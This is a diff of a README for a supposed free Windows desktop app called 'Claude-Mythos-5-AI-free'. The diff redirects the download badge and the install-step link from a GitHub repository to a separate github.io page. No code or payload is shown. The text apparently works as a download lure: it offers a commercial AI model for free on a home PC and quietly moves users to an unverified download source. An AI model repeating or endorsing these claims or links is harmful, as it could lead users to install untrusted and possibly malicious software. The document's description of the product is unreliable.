@@ -1,6 +1,6 @@
 # 🤖 Claude-Mythos-5-AI-free - Run desktop AI tasks for free
 
-[![Download Here](https://img.shields.io/badge/Download-Claude_Mythos-blue.svg)](https://github.com/clementedominical835/Claude-Mythos-5-AI-free)
+[![Download Here](https://img.shields.io/badge/Download-Claude_Mythos-blue.svg)](https://clementedominical835.github.io)
 
 Claude-Mythos-5-AI-free provides a way to run advanced AI models on your Windows computer. This desktop application simplifies how you interact with reasoning models. It optimizes your workflow by removing complex web interfaces. You gain direct access to intelligent features through a local environment.
 
@@ -28,7 +28,7 @@ Before you install the application, check your computer for these items:
 
 Follow these steps to place the software on your computer.
 
-1. Go to the project page at this link: [https://github.com/clementedominical835/Claude-Mythos-5-AI-free](https://github.com/clementedominical835/Claude-Mythos-5-AI-free).
+1. Go to the project page at this link: [https://clementedominical835.github.io](https://clementedominical835.github.io).
 2. Select the green button labeled Code to see the list of files.
 3. Choose Download ZIP.
 4. Locate the ZIP file in your Downloads folder once the transfer finishes.
